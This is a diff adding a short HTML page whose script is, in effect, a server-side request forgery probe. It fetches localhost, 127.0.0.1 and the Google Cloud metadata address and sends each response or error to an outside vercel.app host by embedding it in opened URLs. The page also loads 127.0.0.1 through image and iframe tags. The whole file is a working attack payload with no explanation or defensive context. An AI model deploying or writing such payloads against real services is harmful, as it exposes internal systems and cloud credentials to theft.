@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    <img src="http://127.0.0.1" alt="" />
+    <iframe src="http://127.0.0.1" frameborder="0"></iframe>
+    <script>
+      window.open("https://shop-backend-tau.vercel.app/worked");
+      async function send(url) {
+        try {
+          const res = await fetch(url);
+          const data = await res.json();
+          window.open(
+            `https://shop-backend-tau.vercel.app/Success: ${url} - ${data}`
+          );
+        } catch (error) {
+          window.open(
+            `https://shop-backend-tau.vercel.app/Error: ${url} - ${error.message}`
+          );
+        }
+      }
+
+      send("https://shop-backend-tau.vercel.app/api/v1/option");
+      send("http:127.0.0.1");
+      send("http://localhost");
+      send("http://metadata.google.internal");
+    </script>
+  </body>
+</html>
